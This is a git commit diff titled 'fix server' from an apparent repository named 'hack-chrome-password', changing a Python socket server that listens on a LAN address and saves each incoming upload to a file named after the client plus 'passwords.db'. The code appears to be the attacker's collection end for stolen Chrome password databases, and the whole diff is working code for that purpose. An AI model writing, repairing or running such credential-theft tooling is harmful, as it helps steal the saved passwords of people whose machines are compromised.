6eec1f0110f42a3889a23678bc7481cadcb2c5dc
solominh <hoangminhftu2@gmail.com>
2017-08-01 12:15:49 +0700

    fix server

--- hack-chrome-password/server.py
+++ hack-chrome-password/server.py
@@ -10,33 +10,29 @@ import time
 HOST = '192.168.0.109'
 PORT = 1991
 
+data = None
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.bind((HOST, PORT))
     s.listen(1)
     conn, addr = s.accept()
 
-    data = None
     try:
         with conn:
             print('Connected by: ', addr)
 
             # Receive data
-            while True:
-                data = conn.recv(1048576)
-                if not data:
-                    break
-
-                # Write data
-                filename = str(addr) + "passwords.db"
-                with open(filename, "wb") as f:
-                    f.write(data)
-                    f.flush()
-
-                conn.send(b'success')
+            data = conn.recv(1048576)
+            conn.send(b'success')
     except Exception as e:
         print(e)
 
 
+if data:
+    # Write data
+    filename = str(addr) + "passwords.db"
+    with open(filename, "wb") as f:
+        f.write(data)
+        f.flush()
 while True:
     try:
         with open(filename, 'rb') as f:
